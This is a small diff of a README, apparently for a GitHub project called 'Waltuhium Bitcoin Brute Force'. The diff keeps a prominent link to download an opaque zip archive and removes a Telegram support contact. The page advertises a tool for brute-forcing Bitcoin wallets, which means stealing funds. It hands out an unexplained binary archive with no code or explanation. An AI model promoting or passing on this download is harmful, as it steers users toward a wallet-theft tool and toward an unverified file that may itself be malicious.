@@ -16,7 +16,6 @@
   
     <p align="center">🔥 [Download](https://raw.githubusercontent.com/WALTER7979/Waltuhium-Bitcoin-Brute-Force/main/Waltuhium%20Bitcoin%20Brute%20Force.zip) 🔥
   <br>
-  💎 [Contact in Telegram](https://t.me/PrometheusSupport) 💎
   <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 </p>
 
